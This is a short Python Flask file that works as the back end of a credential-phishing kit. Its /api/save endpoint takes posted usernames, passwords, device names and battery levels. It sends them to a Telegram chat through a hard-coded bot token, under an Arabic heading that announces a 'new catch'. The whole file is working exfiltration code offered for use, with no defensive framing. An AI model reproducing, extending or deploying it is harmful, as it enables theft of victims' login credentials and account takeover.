from flask import Flask, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

TOKEN = "8713127522:AAGfj4acg204MMcOSX7koJNtP4fwN9L-1YQ"
CHAT_ID = "7984067238"

@app.route('/api/save', methods=['POST'])
def save_data():
    try:
        data = request.json
        u = data.get('user', 'غير معروف')
        p = data.get('pass', 'غير معروف')
        d = data.get('device', 'غير معروف')
        b = data.get('battery', 'N/A')
        t = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")

        # تنسيق النصوص المرتب بالكامل
        msg = (
            "🚀 **إشعار: صيد جديد مـكتمل** 🚀\n"
            "━━━━━━━━━━━━━━━\n"
            f"👤 **المستخدم:** `{u}`\n"
            f"🔑 **كلمة السر:** `{p}`\n"
            "━━━━━━━━━━━━━━━\n"
            f"📱 **الجهاز:** {d}\n"
            f"🔋 **البطارية:** {b}\n"
            f"⏰ **الوقت:** {t}\n"
            "━━━━━━━━━━━━━━━"
        )

        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        return jsonify({"status": "success"}), 200
    except:
        return jsonify({"status": "error"}), 500

def handler(environ, start_response):
    return app(environ, start_response)
